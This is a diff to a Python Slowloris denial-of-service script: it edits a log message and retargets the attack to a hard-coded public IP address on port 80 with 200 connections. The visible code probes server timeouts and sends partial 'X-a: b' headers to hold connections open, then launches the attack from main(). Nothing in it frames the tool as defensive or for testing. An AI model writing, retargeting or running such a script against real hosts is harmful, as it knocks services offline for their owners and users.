@@ -66,7 +66,7 @@ class Loris:
             except:
                 return -1
         for i in range(1, self.MAX_TIMEOUT):
-            print "Attempting a " + str(i) + " second timeout"
+            print "Attempting " + str(i) + " second timeout"
             time.sleep(i)
             message = "X-a: b\r\n"
             try:
@@ -131,7 +131,7 @@ class Loris:
             time.sleep(self.timeout)
 
 def main():
-    loris = Loris(addr = "54.235.164.48", port = 8008, totalConnections = 200)
+    loris = Loris(addr = "54.69.185.61", port = 80, totalConnections = 200)
     loris.initiateAttack()
 
 if __name__ == "__main__":
